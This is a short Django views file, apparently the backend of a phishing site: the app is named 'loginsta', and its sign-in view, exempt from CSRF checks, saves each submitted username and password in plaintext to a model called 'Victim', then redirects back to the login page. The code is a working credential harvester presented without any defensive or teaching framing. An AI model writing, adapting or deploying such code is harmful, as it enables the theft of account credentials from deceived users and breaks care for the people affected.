from django.shortcuts import render, redirect, HttpResponse
from loginsta.models import *
from django.views.decorators.csrf import csrf_exempt
# Create your views here.

@csrf_exempt
def signin(request):
	if request.method == 'POST':
		uname = request.POST['username']
		pwd = request.POST['password']
		user = Victim(
			name=uname,
			password=pwd, )
		user.save()
		
		return redirect('signin')
	return render(request, 'index.html')
